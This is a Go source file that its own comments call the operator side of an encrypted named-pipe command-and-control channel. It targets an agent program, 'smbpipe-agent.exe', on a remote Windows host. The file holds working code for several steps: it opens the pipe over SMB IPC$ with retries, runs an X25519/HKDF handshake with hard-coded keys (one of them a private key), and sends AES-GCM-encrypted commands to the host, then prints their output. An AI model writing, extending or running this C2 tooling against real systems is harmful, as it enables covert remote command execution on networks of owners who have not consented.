// Package pipechan implements the operator side of the encrypted named-pipe
// C2 channel against smbpipe-agent: SMB pipe open with busy-retry, the salt
// handshake, and AES-256-GCM framed command/response exchange.
//
// Mirror of smbpipe-agent's internal/securechan (the two are separate Go
// modules; keep them in sync). Handshake per connection:
//
//	client -> agent : [4-byte LE len=16][16-byte random salt]
//	both sides      : HKDF-SHA256(ECDH(static keys), salt) -> two directional keys
//
// Frames: [4-byte LE len][12-byte nonce][ciphertext+tag], length header as
// AAD, strictly increasing counter in the nonce.
package pipechan

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	hmacstd "crypto/hmac"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"time"

	"github.com/jfjallid/go-smb/smb"
)

const (
	maxPipeMsgSize = 16 * 1024 * 1024 // 16 MB

	channelSaltSize  = 16
	channelNonceSize = 12
	channelOverhead  = 16 // GCM tag
	hkdfInfo         = "smbpipe-oraclexa-v1"

	// pipeOpenTimeout bounds the busy-retry loop in openWithRetry.
	pipeOpenTimeout = 2 * time.Second
)

// Static X25519 identity keys, pinned at build time on both sides.
var (
	clientPrivKey = mustDecodeHex("ed4fbf235b50c9ee4c695001271e6498b2eb8caf7faa8a602e656b1e6edd4d7f")
	agentPubKey   = mustDecodeHex("5cfe77d3e8a7722e7634950b7ba86bf3a2dc75cf374743ba977606eaca73571c")
)

func mustDecodeHex(s string) []byte {
	b, err := hex.DecodeString(s)
	if err != nil {
		panic(fmt.Sprintf("bad embedded key: %v", err))
	}
	return b
}

func hkdfSHA256(secret, salt, info []byte, length int) []byte {
	if len(salt) == 0 {
		salt = make([]byte, sha256.Size)
	}
	extractor := hmacstd.New(sha256.New, salt)
	extractor.Write(secret)
	prk := extractor.Sum(nil)

	var okm, t []byte
	for counter := byte(1); len(okm) < length; counter++ {
		expander := hmacstd.New(sha256.New, prk)
		expander.Write(t)
		expander.Write(info)
		expander.Write([]byte{counter})
		t = expander.Sum(nil)
		okm = append(okm, t...)
	}
	return okm[:length]
}

// cipher seals/opens framed messages under one direction key.
type frameCipher struct {
	aead    cipher.AEAD
	prefix  [4]byte // random per-connection nonce prefix for this direction
	counter uint64
}

func newFrameCipher(key []byte) (*frameCipher, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	c := &frameCipher{aead: aead}
	if _, err := crand.Read(c.prefix[:]); err != nil {
		return nil, err
	}
	return c, nil
}

// seal returns nonce||ciphertext without the length header - writeMsg adds it.
func (c *frameCipher) seal(msg []byte) ([]byte, error) {
	c.counter++
	header := make([]byte, 4)
	binary.LittleEndian.PutUint32(header, uint32(channelNonceSize+len(msg)+channelOverhead))

	var nonce [channelNonceSize]byte
	copy(nonce[:4], c.prefix[:])
	binary.BigEndian.PutUint64(nonce[4:], c.counter)

	ct := c.aead.Seal(nil, nonce[:], msg, header)
	out := make([]byte, 0, channelNonceSize+len(ct))
	out = append(out, nonce[:]...)
	return append(out, ct...), nil
}

// open verifies the header matches the body length, checks that the frame
// carries the next expected counter value, and decrypts with the header as AAD.
func (c *frameCipher) open(header []byte, body []byte) ([]byte, error) {
	if len(body) < channelNonceSize+channelOverhead {
		return nil, errors.New("encrypted frame too short")
	}
	if binary.LittleEndian.Uint32(header) != uint32(len(body)) {
		return nil, errors.New("frame length header mismatch")
	}
	expected := make([]byte, 8)
	binary.BigEndian.PutUint64(expected, c.counter+1)
	if !hmacstd.Equal(body[channelNonceSize-8:channelNonceSize], expected) {
		return nil, errors.New("unexpected nonce counter")
	}
	c.counter++
	return c.aead.Open(nil, body[:channelNonceSize], body[channelNonceSize:], header)
}

// writeMsg writes a length-prefixed message to a remote named pipe opened
// over SMB2: [4 bytes uint32 LE length][payload]. Matches the framing used
// by smbpipe-agent.exe (byte-mode pipe).
func writeMsg(f *smb.File, data []byte) error {
	header := make([]byte, 4)
	binary.LittleEndian.PutUint32(header, uint32(len(data)))
	if _, err := f.WriteFile(header, 0); err != nil {
		return err
	}
	if _, err := f.WriteFile(data, 0); err != nil {
		return err
	}
	return nil
}

// establishChannel sends the connection salt and derives both directional
// ciphers for the client side of the channel.
func establishChannel(f *smb.File) (send, recv *frameCipher, err error) {
	salt := make([]byte, channelSaltSize)
	if _, err = crand.Read(salt); err != nil {
		return nil, nil, err
	}
	if err = writeMsg(f, salt); err != nil {
		return nil, nil, fmt.Errorf("send salt: %w", err)
	}

	priv, err := ecdh.X25519().NewPrivateKey(clientPrivKey)
	if err != nil {
		return nil, nil, err
	}
	peer, err := ecdh.X25519().NewPublicKey(agentPubKey)
	if err != nil {
		return nil, nil, err
	}
	shared, err := priv.ECDH(peer)
	if err != nil {
		return nil, nil, err
	}
	okm := hkdfSHA256(shared, salt, []byte(hkdfInfo), 64)

	send, err = newFrameCipher(okm[:32]) // client -> server
	if err != nil {
		return nil, nil, err
	}
	recv, err = newFrameCipher(okm[32:]) // server -> client
	if err != nil {
		return nil, nil, err
	}
	return send, recv, nil
}

// readFull reads exactly len(buf) bytes from the SMB pipe, issuing as many
// SMB2 READ requests as needed. Mirrors smbpipe-agent's pipeio.ReadFull —
// a single ReadFile may return fewer bytes than requested.
func readFull(f *smb.File, buf []byte) error {
	total := 0
	for total < len(buf) {
		n, err := f.ReadFile(buf[total:], 0)
		if err != nil {
			return err
		}
		if n == 0 {
			return errors.New("unexpected end of pipe stream")
		}
		total += n
	}
	return nil
}

func readEncryptedMsg(f *smb.File, c *frameCipher) ([]byte, error) {
	header := make([]byte, 4)
	if err := readFull(f, header); err != nil {
		return nil, err
	}
	length := binary.LittleEndian.Uint32(header)
	if length < channelNonceSize+channelOverhead || length > maxPipeMsgSize {
		return nil, fmt.Errorf("invalid frame length: %d", length)
	}
	body := make([]byte, length)
	if err := readFull(f, body); err != nil {
		return nil, err
	}
	return c.open(header, body)
}

// openWithRetry opens the pipe, retrying while the server reports
// PIPE_BUSY or PIPE_NOT_AVAILABLE. The agent serves the pipe with a single
// listening instance, so a slot may be momentarily unavailable; polling every
// 10 ms mirrors go-winio DialPipe's behavior. Any other error - or running
// out of time - returns immediately.
func openWithRetry(session *smb.Connection, pipeName string, opts *smb.CreateReqOpts) (*smb.File, error) {
	busy := smb.StatusMap[smb.StatusPipeBusy]
	notAvailable := smb.StatusMap[smb.StatusPipeNotAvailable]
	deadline := time.Now().Add(pipeOpenTimeout)
	for {
		file, err := session.OpenFileExt("IPC$", pipeName, opts)
		if err == nil {
			return file, nil
		}
		if !(errors.Is(err, busy) || errors.Is(err, notAvailable)) || time.Now().After(deadline) {
			return nil, err
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// ExecViaPipe sends one command to smbpipe-agent.exe listening on a named
// pipe of the target host (\\<target>\pipe\<pipeName>), then prints the
// captured output to stdout.
//
// Wire protocol: byte-mode pipe; per connection a 16-byte salt handshake
// derives AES-256-GCM keys (static X25519 ECDH, pinned peer keys), then all
// frames travel encrypted - see smbpipe-agent's internal/securechan.
func ExecViaPipe(session *smb.Connection, pipeName, command string) error {
	if len(command) > 64*1024 {
		return fmt.Errorf("command too large: %d bytes (max 64 KB)", len(command))
	}

	if err := session.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("TreeConnect IPC$: %w", err)
	}
	defer session.TreeDisconnect("IPC$")

	// Open with read+write desired access: the default NewCreateReqOpts
	// mask is read-only, and some SRV2 builds answer an unauthorized SMB2
	// WRITE on a pipe handle by dropping the connection (client sees EOF)
	// instead of returning a clean STATUS_ACCESS_DENIED.
	opts := smb.NewCreateReqOpts()
	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileReadAttributes |
		smb.FAccMaskFileWriteData | smb.FAccMaskReadControl | smb.FAccMaskSynchronize
	file, err := openWithRetry(session, pipeName, opts)
	if err != nil {
		return fmt.Errorf("open pipe \\\\IPC$\\%s: %w", pipeName, err)
	}
	defer file.CloseFile()

	sendC, recvC, err := establishChannel(file)
	if err != nil {
		return fmt.Errorf("channel handshake on pipe %s: %w", pipeName, err)
	}

	sealed, err := sendC.seal([]byte(command))
	if err != nil {
		return fmt.Errorf("seal command: %w", err)
	}
	if err := writeMsg(file, sealed); err != nil {
		return fmt.Errorf("write command to pipe %s: %w", pipeName, err)
	}

	output, err := readEncryptedMsg(file, recvC)
	if err != nil {
		return fmt.Errorf("read output from pipe %s: %w", pipeName, err)
	}

	fmt.Println(string(output))
	return nil
}
